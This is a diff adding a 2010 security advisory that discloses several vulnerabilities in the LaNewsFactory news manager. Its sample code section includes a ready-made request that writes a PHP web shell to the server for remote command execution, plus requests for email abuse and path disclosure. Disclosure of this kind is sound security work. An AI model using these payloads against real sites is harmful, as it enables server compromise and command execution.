@@ -1,0 +1,102 @@
+LaNewsFactory Multiple Remote Vulnerabilities
+http://www.salvatorefresta.net/files/adv/LaNewsFactory%20Multiple%20Remote%20Vulnerabilities-19042010.txt
+
+ Name              LaNewsFactory
+ Vendor            Christophe Brocas
+ Versions Affected <= 1.0.0
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-04-19
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ VI.   DISCLOSURE TIMELINE
+ 
+
+I. ABOUT THE APPLICATION
+
+This  is  a  very used  news manager that  not require a
+database.
+
+
+II. DESCRIPTION
+
+This news managment is affected  by many  vulnerabilities
+that  allows  a  guest  to  write  arbitrary files on the
+system, include local files, read local files etc..
+
+
+III. ANALYSIS
+
+Summary:
+
+ A) Anonymous email
+ B) Remote File Writing
+ C) Multiple Local File Inclusion
+ D) Full Path Disclosure
+
+A) Anonymous email
+
+The mailto.php file allows a guest to send arbitrary emails.
+The input is not properly sanitised:
+
+if (ValidEmailAdress($youremail) and ValidEmailAdress($friendemail))
+{
+	mail ($friendemail, $display[$lang]["mailtoafriend"],"$comments\n\n".$url."print".$LNF_file_extension."?art=$newsfilename\n\n$yourname", "From: $youremail");
+
+
+B) Remote File Writing
+
+The save-edited-news.php  file  allows a guest to write a
+file  on the  system.  This  vulnerability may be used to
+execute remote commands on the system.
+
+
+C) Multiple Local File Inclusion
+
+There are many files that use a not sanitised input with
+include PHP function. This  vulnerability  may be used to
+execute remote commands by including the Apache Log file.
+
+
+D) Full Path Disclosure
+
+For  example,   print.php  file  prints  many  errors  by
+including the full path of the file.  This  path  may  be
+very useful for local file inclusion and other.
+
+
+
+IV. SAMPLE CODE
+
+A) Anonymous email
+
+	mailto.php?friendemail=target@email.com&youremail=ano@email.com&comments=suck!
+	
+	
+B) Remote File Writing to Remote Command Execution
+
+	save-edited-news.php?art=news/file.php&corps=<?php system($_GET[cmd]); ?>
+	
+	
+D) Full Path Disclosure
+
+	print.php?art=-1.xml
+
+
+V. FIX
+
+No fix.
+
+
+VIII. DISCLOSURE TIMELINE
+
+2010-04-19 Bugs discovered
+2010-04-19 Advisory released
